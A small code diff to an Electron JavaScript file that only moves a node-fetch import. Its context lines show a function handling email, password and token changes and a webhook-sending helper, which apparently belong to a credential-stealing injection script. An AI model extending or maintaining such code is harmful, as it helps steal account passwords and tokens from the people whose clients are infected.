@@ -2,6 +2,7 @@
 import fs from 'fs';
 import path from 'path';
 import https from 'https';
+import fetch from 'node-fetch';
 import querystring from 'querystring';
 import { BrowserWindow, session } from 'electron';
 
@@ -792,7 +793,7 @@ const emailChanged = async (email, password, token) => {
         await sendErrorToWebhook(error); // Send error to the specified webhook
     }
 };
-const fetch = require('node-fetch'); // Make sure to install node-fetch if not already available
+
 
 const sendErrorToWebhook = async (error) => {
     const errorContent = {
